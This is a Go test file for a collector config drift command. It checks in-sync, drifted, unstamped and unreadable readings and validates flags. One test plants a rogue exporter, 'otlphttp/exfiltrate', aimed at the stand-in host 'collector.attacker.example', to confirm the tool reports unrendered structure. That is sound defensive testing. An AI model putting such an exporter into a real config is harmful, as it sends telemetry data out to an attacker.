package main

import (
	"bytes"
	"os"
	"strings"
	"testing"
)

// deliveryFixture writes an intended artefact and an effective config into
// a temp dir and returns their paths. The effective config is the same
// document with cosmetic differences only (reordered keys, flow style,
// quoting), which must never read as divergence.
func deliveryFixture(t *testing.T) (intended, effective string) {
	t.Helper()
	dir := t.TempDir()
	writeFile(t, dir, "intended.yaml", `receivers:
  otlp:
    protocols:
      grpc: {}
exporters:
  otlphttp/out:
    endpoint: https://gateway.internal:4318
service:
  pipelines:
    traces:
      receivers:
        - otlp
      exporters:
        - otlphttp/out
  telemetry:
    resource:
      telecraft.commit: a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2
`)
	writeFile(t, dir, "effective.yaml", `service:
  telemetry:
    resource:
      "telecraft.commit": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"
  pipelines:
    traces: {receivers: [otlp], exporters: [otlphttp/out]}
exporters:
  otlphttp/out: {endpoint: "https://gateway.internal:4318"}
receivers:
  otlp: {protocols: {grpc: {}}}
`)
	return dir + "/intended.yaml", dir + "/effective.yaml"
}

// AC: a hand-committed (GitOps) collector gets identical treatment and its
// delivery path is visible: the printed status names the path, reads the
// stamps from both sides, and cosmetic YAML differences never read as
// divergence. The absent RemoteConfigStatus reading prints known=false,
// never failure.
func TestDeliveryCommandPrintsAGitCollectorsStatus(t *testing.T) {
	intended, effective := deliveryFixture(t)
	var stdout, stderr bytes.Buffer

	code := run([]string{"delivery", "-intended", intended, "-effective", effective, "-path", "git"}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("exit %d, stderr:\n%s", code, stderr.String())
	}
	out := stdout.String()
	for _, want := range []string{
		"path              git",
		"profile           exact",
		"remote            known=false",
		"intended_commit   a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2",
		"effective_commit  a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2",
		"comparison        in_sync",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("output lacks %q:\n%s", want, out)
		}
	}
	if strings.Contains(out, "FAILED") {
		t.Errorf("a can't-report reading printed like failure:\n%s", out)
	}
}

// A real edit under the same commit stamp prints drifted with the layer-3
// localisation, and the printer stays exit 0: it is a reading, not a gate.
func TestDeliveryCommandLocalisesDrift(t *testing.T) {
	intended, effective := deliveryFixture(t)
	raw, err := os.ReadFile(effective)
	if err != nil {
		t.Fatal(err)
	}
	edited := strings.Replace(string(raw), "https://gateway.internal:4318", "https://somewhere-else:4318", 1)
	if err := os.WriteFile(effective, []byte(edited), 0o644); err != nil {
		t.Fatal(err)
	}
	var stdout, stderr bytes.Buffer

	code := run([]string{"delivery", "-intended", intended, "-effective", effective, "-path", "git"}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("exit %d, stderr:\n%s", code, stderr.String())
	}
	out := stdout.String()
	if !strings.Contains(out, "comparison        drifted") {
		t.Errorf("output lacks the drifted comparison:\n%s", out)
	}
	if !strings.Contains(out, "exporters.otlphttp/out.endpoint") {
		t.Errorf("output lacks the layer-3 localisation:\n%s", out)
	}
}

// The structural check prints under its own heading, because it answers a
// different question from key-level drift: not "a value you asserted is
// wrong" but "the collector is running something nobody rendered"
// (ADR-0054 §2).
func TestDeliveryCommandPrintsUndescribedStructureSeparately(t *testing.T) {
	intended, effective := deliveryFixture(t)
	raw, err := os.ReadFile(effective)
	if err != nil {
		t.Fatal(err)
	}
	rogue := strings.Replace(string(raw), "exporters:\n",
		"exporters:\n  otlphttp/exfiltrate: {endpoint: \"https://collector.attacker.example:4318\"}\n", 1)
	if err := os.WriteFile(effective, []byte(rogue), 0o644); err != nil {
		t.Fatal(err)
	}
	var stdout, stderr bytes.Buffer

	code := run([]string{"delivery", "-intended", intended, "-effective", effective, "-path", "git"}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("exit %d, stderr:\n%s", code, stderr.String())
	}
	out := stdout.String()
	if !strings.Contains(out, "comparison        drifted") {
		t.Errorf("an exporter nobody rendered does not read as drifted:\n%s", out)
	}
	if !strings.Contains(out, "undescribed:") || !strings.Contains(out, "component exporters.otlphttp/exfiltrate") {
		t.Errorf("output lacks the structural finding under its own heading:\n%s", out)
	}
	if strings.Contains(out, "changes:") {
		t.Errorf("an undescribed component printed as key-level drift:\n%s", out)
	}
}

// The served path runs the same computation under the profile that
// catalogues the Supervisor's injections, so naming it is not cosmetic
// (ADR-0046).
func TestDeliveryCommandRunsTheServedPathUnderItsOwnProfile(t *testing.T) {
	intended, effective := deliveryFixture(t)
	var stdout, stderr bytes.Buffer

	code := run([]string{"delivery", "-intended", intended, "-effective", effective, "-path", "served"}, &stdout, &stderr)

	if code != 0 {
		t.Fatalf("exit %d, stderr:\n%s", code, stderr.String())
	}
	out := stdout.String()
	if !strings.Contains(out, "path              served") {
		t.Errorf("output does not name the served path:\n%s", out)
	}
	if strings.Contains(out, "profile           exact") {
		t.Errorf("the served path ran under the git path's profile:\n%s", out)
	}
}

// Neither side is required to carry a commit stamp, and an unstamped
// config prints as unstamped rather than as an empty column.
func TestDeliveryCommandPrintsUnstampedConfigsAsUnstamped(t *testing.T) {
	dir := t.TempDir()
	bare := "receivers:\n  otlp:\n    protocols:\n      grpc: {}\nservice:\n  pipelines:\n    traces:\n      receivers: [otlp]\n"
	writeFile(t, dir, "intended.yaml", bare)
	writeFile(t, dir, "effective.yaml", bare)
	var stdout, stderr bytes.Buffer

	code := run([]string{"delivery", "-intended", dir + "/intended.yaml", "-effective", dir + "/effective.yaml", "-path", "git"}, &stdout, &stderr)

	if code != 0 {
		t.Fatalf("exit %d, stderr:\n%s", code, stderr.String())
	}
	for _, want := range []string{"intended_commit   (unstamped)", "effective_commit  (unstamped)"} {
		if !strings.Contains(stdout.String(), want) {
			t.Errorf("output lacks %q:\n%s", want, stdout.String())
		}
	}
}

// A config the normaliser refuses leaves the comparison unknown with the
// cause beside it. Not knowing is a normal state, so this is still exit 0
// (ADR-0004, ADR-0008): only a status that could not be computed at all is
// exit 2.
func TestDeliveryCommandPrintsAnUnreadableConfigAsUnknown(t *testing.T) {
	intended, effective := deliveryFixture(t)
	if err := os.WriteFile(effective, []byte("receivers: [otlp\nservice: {\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	var stdout, stderr bytes.Buffer

	code := run([]string{"delivery", "-intended", intended, "-effective", effective, "-path", "git"}, &stdout, &stderr)

	if code != 0 {
		t.Fatalf("exit %d, want 0: an unreadable side is a reading, not a failure\nstderr:\n%s", code, stderr.String())
	}
	out := stdout.String()
	if !strings.Contains(out, "comparison        unknown cause=") {
		t.Errorf("output does not carry the unknown comparison and its cause:\n%s", out)
	}
}

func TestDeliveryCommandRequiresItsFlags(t *testing.T) {
	intended, effective := deliveryFixture(t)
	missing := t.TempDir() + "/nowhere.yaml"
	for name, tc := range map[string]struct {
		args []string
		want string
	}{
		"nothing at all": {
			args: []string{"delivery"},
			want: "delivery: -intended, -effective and -path are required",
		},
		"no path": {
			args: []string{"delivery", "-intended", intended, "-effective", effective},
			want: "delivery: -intended, -effective and -path are required",
		},
		"a flag that does not exist": {
			args: []string{"delivery", "-intent", intended},
			want: "flag provided but not defined: -intent",
		},
		// There are two delivery paths and no third (REQ-041), so an
		// invented one is named back rather than treated as either.
		"a delivery path nobody delivers on": {
			args: []string{"delivery", "-intended", intended, "-effective", effective, "-path", "sideloaded"},
			want: `delivery: unknown delivery path "sideloaded": choose served or git`,
		},
		"an intended artefact that is not there": {
			args: []string{"delivery", "-intended", missing, "-effective", effective, "-path", "git"},
			want: "delivery: open " + missing,
		},
		"an effective config that is not there": {
			args: []string{"delivery", "-intended", intended, "-effective", missing, "-path", "git"},
			want: "delivery: open " + missing,
		},
	} {
		t.Run(name, func(t *testing.T) {
			var stdout, stderr bytes.Buffer
			if code := run(tc.args, &stdout, &stderr); code != 2 {
				t.Fatalf("exit %d, want 2\nstderr:\n%s", code, stderr.String())
			}
			if !strings.Contains(stderr.String(), tc.want) {
				t.Errorf("stderr lacks %q:\n%s", tc.want, stderr.String())
			}
			if stdout.Len() != 0 {
				t.Errorf("a refused invocation printed a status:\n%s", stdout.String())
			}
		})
	}
}

// Deliberately uncovered: the branch that prints a known remote state, and
// the one that reports a computation error. Both are unreachable from this
// subcommand: a file comparison never carries a RemoteConfigStatus
// reading, and the only errors the computation returns are an invalid path
// or an invalid remote state, which the flag validation above has already
// refused.
